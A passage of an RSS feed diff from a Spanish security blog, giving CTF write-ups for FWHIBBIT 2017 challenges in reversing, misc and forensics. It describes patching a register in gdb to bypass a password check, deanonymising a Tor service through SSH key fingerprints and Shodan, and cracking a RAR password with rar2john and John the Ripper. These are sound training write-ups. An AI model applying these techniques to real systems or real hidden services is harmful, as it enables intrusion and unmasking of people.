+&lt;p&gt;Empezamos a debuggear con gdbserver, para que se alcance el breakpoint hay que meter una password cualquiera, yo por ejemplo he metido el carácter “a”.
+Una vez alcanzado el breakpoint lo único que hay que hacer es que se cumpla la condición para que salte al código que queremos y es que eax(en este caso rax porque es de 64 bits) sea 0.
+Al haber metido el caracter “a” de contraseña, en rax nos aparece 0x00….D, por lo que le seteamos a 0:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/africa2.png&quot; alt=&quot;Reversing Africa &quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;y volvemos a pulsar el boton de run para que nos escupa la flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/africa3.png&quot; alt=&quot;Reversing Africa &quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 21 Feb 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/reversing/2017/02/21/writeup-reversing-ctf-fwhibbit.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/reversing/2017/02/21/writeup-reversing-ctf-fwhibbit.html</guid>
+        
+        <category>writeup</category>
+        
+        
+        <category>reversing</category>
+        
+      </item>
+    
+      <item>
+        <title>Writeup [Misc] FWHIBBIT 2017</title>
+        <description>&lt;h1 id=&quot;information-leakage&quot;&gt;Information Leakage&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 75&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Tanzania&lt;br /&gt;
+&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&quot;flag.followthewhiterabbit.es&quot;&gt;flag.followthewhiterabbit.es&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; Our experts claim that we have suffered an important information leak thanks to our domain: flag.followthewhiterabbit.es
+Can you check if this is true?&lt;/p&gt;
+
+&lt;p&gt;Nos dan una url, por lo intentamos acceder a ella por el navegador y nos devuelve que no es alcanzable.
+Por lo que lanzamos el comando host -a para ver toda la información del subdominio.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/tanzania1.png&quot; alt=&quot;Misc Tanzania&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que nos muestra la flag.
+fwhibbit{DnS_L3ak}&lt;/p&gt;
+
+&lt;h1 id=&quot;torxicity&quot;&gt;TORxicity&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 300&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Colombia&lt;br /&gt;
+&lt;strong&gt;Link:&lt;/strong&gt; &lt;a href=&quot;http://rabbit3yfa6dcgka.onion&quot;&gt;http://rabbit3yfa6dcgka.onion&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; We recently found that a group of people are selling female rabbit extract. You need to find their real server, and deanonimize them!&lt;/p&gt;
+
+&lt;p&gt;Este reto era igual que uno que salío en el CTF de la ekoparty por lo que ya sabíamos como se resolvía.
+Intentamos conectarnos por ssh al dominio facilitado para obtener el fingerprinting de la clave del host.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia1.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y probamos a buscarlo en shodan, por si acaso hubiera suerte.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia2.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;No lo hemos encontrado, por lo que utilizamos el comando ssh-keyscan para buscar las claves públicas.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia3.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos las claves en el fichero keys, utilizamos el comando ssh-keygen para generar las claves que más tarde pasaremos a buscar&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia4.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y pasamos a comprobar si alguno de los resultados se encuentra en shodan como hemos hecho anteriormente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia5.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta vez ha habido suerte y obtenemos una IP. Entramos a la IP con el navegador y obtenemos la flag.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/colombia6.png&quot; alt=&quot;Misc Colombia&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 21 Feb 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/misc/2017/02/21/writeup-misc-ctf-fwhibbit.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/misc/2017/02/21/writeup-misc-ctf-fwhibbit.html</guid>
+        
+        <category>writeup</category>
+        
+        
+        <category>misc</category>
+        
+      </item>
+    
+      <item>
+        <title>Writeup [Forense] FWHIBBIT 2017</title>
+        <description>&lt;h1 id=&quot;amnesia&quot;&gt;Amnesia&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Points:&lt;/strong&gt; 200&lt;br /&gt;
+&lt;strong&gt;Country:&lt;/strong&gt; Chile&lt;br /&gt;
+&lt;strong&gt;Attatchment:&lt;/strong&gt; &lt;a href=&quot;https://mega.nz/#!hh0RFKaI!nGKDQXItaLQiZnw_WygT3-ga7alXUKkisl2wC8uej6s&quot;&gt;https://mega.nz/#!hh0RFKaI!nGKDQXItaLQiZnw_WygT3-ga7alXUKkisl2wC8uej6s&lt;/a&gt;&lt;br /&gt;
+&lt;strong&gt;Description:&lt;/strong&gt; Our favorite rabbit has lost its pendrive, inside, you can find sensitive information that should not be discovered by the queen. He doesn’t remember the password of the file or where the information was hidden! Can you help him?&lt;/p&gt;
+
+&lt;p&gt;Desde el enlace nos bajamos un fichero con nombre “ch4ll3nger.rar” que está protegido con contraseña.Pasamos a intentar creakear la contraseña con la versión de John de ripper mejorada(john jumbo) de manera que utilizamos el siguiente comando para generar el hash de la password del fichero que más tarde pasaremos a crackear.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;./rar2john ch4ll3nger.rar &amp;gt; challenger.john&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Una vez que tenemos el hash de la password del fichero rar, pasamos a crackearlo.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/chile1.png&quot; alt=&quot;Forense Chile&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;La contraseña resulta ser “password”, por lo que descomprimimos y obtenemos un fichero llamado “ch4ll3ng3r.ad1”. La extensión del fichero indica que es una imagen que se ha tomado con FTK Imager, por lo que la abrimos con FTK Imager y en la papelera nos encontramos con un fichero de texto en rot13.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/chile2.png&quot; alt=&quot;Forense Chile &quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo ponemos en claro y vemos el siguiente mensaje donde está la flag:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/CTFS/2017/fwhibbit/chile3.png&quot; alt=&quot;Forense Chile Flag&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;
+
+</description>
+        <pubDate>Tue, 21 Feb 2017 12:11:34 +0000</pubDate>
+        <link>https://blog.roskyfrosky.com/forense/2017/02/21/writeup-forense-ctf-fwhibbit.html</link>
+        <guid isPermaLink="true">https://blog.roskyfrosky.com/forense/2017/02/21/writeup-forense-ctf-fwhibbit.html</guid>
+        
+        <category>writeup</category>
+        
+        
+        <category>forense</category>
+        
+      </item>
+    
+  </channel>
+</rss>
